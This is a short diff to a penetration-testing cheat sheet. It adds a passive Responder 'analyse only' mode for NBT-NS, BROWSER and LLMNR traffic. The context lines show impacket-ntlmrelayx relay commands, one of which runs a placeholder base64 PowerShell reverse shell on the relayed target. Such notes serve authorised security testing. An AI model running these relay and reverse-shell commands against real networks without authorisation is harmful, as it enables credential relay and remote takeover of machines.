@@ -55,3 +55,10 @@ $ impacket-ntlmrelayx --no-http-server -smb2support -t [target_smb_server]
 # -c can be added to execute commands - https://www.revshells.com/
 $ impacket-ntlmrelayx --no-http-server -smb2support -t [target_smb_server] -c '<example_b64_ps_rev_shell>'
 ```
+
+### Analyse only mode
+This allows us to view NBT-NS, BROWSER, and LLMNR requests without responding
+```bash
+sudo responder -I <interface> -A
+sudo responder --interface <interface> --analyze
+```
